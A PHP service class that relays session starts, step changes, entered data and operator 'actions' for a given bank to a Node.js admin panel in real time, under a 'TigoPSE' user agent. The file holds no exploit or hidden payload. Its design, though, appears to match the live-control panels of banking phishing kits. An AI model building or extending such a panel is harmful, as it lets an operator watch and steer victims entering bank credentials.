<?php
/**
 * PHP Service to integrate with Node.js Admin Panel
 * Sends session updates to WebSocket server with 0 delay
 */

class AdminPanelService 
{
    private $adminServerUrl;
    private $isEnabled;

    public function __construct() 
    {
        $this->adminServerUrl = $_ENV['ADMIN_SERVER_URL'] ?? 'http://localhost:3001';
        $this->isEnabled = ($_ENV['ADMIN_PANEL_ENABLED'] ?? 'true') === 'true';
    }

    /**
     * Register a new session with the admin panel
     */
    public function startSession(string $sessionId, string $bank, array $data = []): bool 
    {
        if (!$this->isEnabled) return true;

        return $this->sendRequest('/api/session/start', [
            'sessionId' => $sessionId,
            'bank' => $bank,
            'step' => 'inicio',
            'data' => $data,
            'timestamp' => time() * 1000
        ]);
    }

    /**
     * Update session step/status
     */
    public function updateSession(string $sessionId, string $step, array $data = [], bool $active = true): bool 
    {
        if (!$this->isEnabled) return true;

        return $this->sendRequest('/api/session/update', [
            'sessionId' => $sessionId,
            'step' => $step,
            'data' => $data,
            'active' => $active,
            'timestamp' => time() * 1000
        ]);
    }

    /**
     * Update session data only
     */
    public function updateSessionData(string $sessionId, array $data): bool 
    {
        if (!$this->isEnabled) return true;

        return $this->sendRequest('/api/session/data', [
            'sessionId' => $sessionId,
            'data' => $data,
            'timestamp' => time() * 1000
        ]);
    }

    /**
     * End a session
     */
    public function endSession(string $sessionId): bool 
    {
        if (!$this->isEnabled) return true;

        return $this->sendRequest('/api/session/end', [
            'sessionId' => $sessionId
        ]);
    }

    /**
     * Execute an admin action (from admin panel to session)
     */
    public function executeAction(string $sessionId, string $action): array 
    {
        if (!$this->isEnabled) {
            return ['success' => false, 'message' => 'Admin panel disabled'];
        }

        $response = $this->sendRequest('/api/admin/action', [
            'sessionId' => $sessionId,
            'action' => $action
        ]);

        return [
            'success' => $response,
            'message' => $response ? 'Acción ejecutada' : 'Error al ejecutar acción'
        ];
    }

    /**
     * Get all active sessions
     */
    public function getActiveSessions(): array 
    {
        if (!$this->isEnabled) return [];

        $response = $this->sendGetRequest('/api/sessions');
        return $response['sessions'] ?? [];
    }

    /**
     * Send HTTP POST request to admin server
     */
    private function sendRequest(string $endpoint, array $data): bool 
    {
        try {
            $url = $this->adminServerUrl . $endpoint;
            $context = stream_context_create([
                'http' => [
                    'method' => 'POST',
                    'header' => [
                        'Content-Type: application/json',
                        'User-Agent: TigoPSE-AdminService/1.0'
                    ],
                    'content' => json_encode($data),
                    'timeout' => 5 // 5 second timeout for real-time feel
                ]
            ]);

            $result = file_get_contents($url, false, $context);
            
            if ($result === false) {
                error_log("[ADMIN SERVICE] Failed to send request to {$url}");
                return false;
            }

            $response = json_decode($result, true);
            return $response['success'] ?? false;

        } catch (Exception $e) {
            error_log("[ADMIN SERVICE] Exception: " . $e->getMessage());
            return false;
        }
    }

    /**
     * Send HTTP GET request to admin server
     */
    private function sendGetRequest(string $endpoint): array 
    {
        try {
            $url = $this->adminServerUrl . $endpoint;
            $context = stream_context_create([
                'http' => [
                    'method' => 'GET',
                    'header' => [
                        'User-Agent: TigoPSE-AdminService/1.0'
                    ],
                    'timeout' => 5
                ]
            ]);

            $result = file_get_contents($url, false, $context);
            
            if ($result === false) {
                error_log("[ADMIN SERVICE] Failed to GET from {$url}");
                return [];
            }

            return json_decode($result, true) ?? [];

        } catch (Exception $e) {
            error_log("[ADMIN SERVICE] GET Exception: " . $e->getMessage());
            return [];
        }
    }

    /**
     * Static helper methods for easy integration
     */
    public static function notifyStart(string $sessionId, string $bank, array $data = []): void 
    {
        $instance = new self();
        $instance->startSession($sessionId, $bank, $data);
    }

    public static function notifyUpdate(string $sessionId, string $step, array $data = []): void 
    {
        $instance = new self();
        $instance->updateSession($sessionId, $step, $data);
    }

    public static function notifyData(string $sessionId, array $data): void 
    {
        $instance = new self();
        $instance->updateSessionData($sessionId, $data);
    }

    public static function notifyEnd(string $sessionId): void 
    {
        $instance = new self();
        $instance->endSession($sessionId);
    }
}